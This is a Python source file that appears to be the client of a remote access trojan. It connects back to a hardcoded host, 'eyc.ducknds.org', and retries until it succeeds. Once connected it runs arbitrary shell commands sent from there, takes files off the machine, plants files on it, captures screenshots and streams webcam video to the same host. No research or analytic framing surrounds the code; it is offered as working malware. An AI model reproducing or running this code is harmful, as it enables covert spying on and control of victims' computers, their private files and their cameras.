import socket
import ssl
import subprocess
import simplejson
import os
import base64
import time
import cv2
import numpy as np
import pickle
import struct
from PIL import ImageGrab
    
class Access_Cam:
    def __init__(self,ip,port):
        self.us=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.us.connect((ip,port))
    
    def access_cam(self):
        try:
            cap=cv2.VideoCapture(0)
            while True:
                try:
                    ret,frame=cap.read()
                    data=pickle.dump(frame)
                    message_size=struct.pack("L", len(data))
                    self.us.sendall(message_size+data)
                except ConnectionError:
                    pass
        except:
            cap=cv2.VideoCapture(1)
            while True:
                try:
                    ret,frame=cap.read()
                    data=pickle.dump(frame)
                    message_size=struct.pack("L", len(data))
                    self.us.sendall(message_size+data)
                except ConnectionError:
                    pass
class MySocket:
	def __init__(self, ip, port):
		self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.s.connect((ip,port))
		self.s = ssl.wrap_socket(self.s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

	def command_execution(self, command):
		if command[0]=="access_camera":
		    a_c=Access_Cam("eyc.ducknds.org",9090)
		    a_c.access_cam()
		else:
			return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = simplejson.dumps(data)
		self.s.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.s.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"
	def screen_shot(self):
		screenshot = ImageGrab.grab()
		screenshot.save("screenshot.png", 'PNG')
		with open("screenshot.png","rb") as my_file:
			b64=base64.b64encode(my_file.read())
		os.remove("screenshot.png")
		return b64
	def start_socket(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.s.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				elif command[0]=="screen_shot":
					command_output=self.screen_shot()
				elif command=="check_connection":
					pass
				elif command[0]=="back":
					pass
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)

		self.s.close()
try:
	my_socket_object = MySocket("eyc.ducknds.org",443)
	my_socket_object.start_socket()
	connected=True
except:
	connected=False
	while not connected:
		try:
			my_socket_object = MySocket("eyc.ducknds.org",443)
			my_socket_object.start_socket()
			connected=True
		except:
			time.sleep(1)
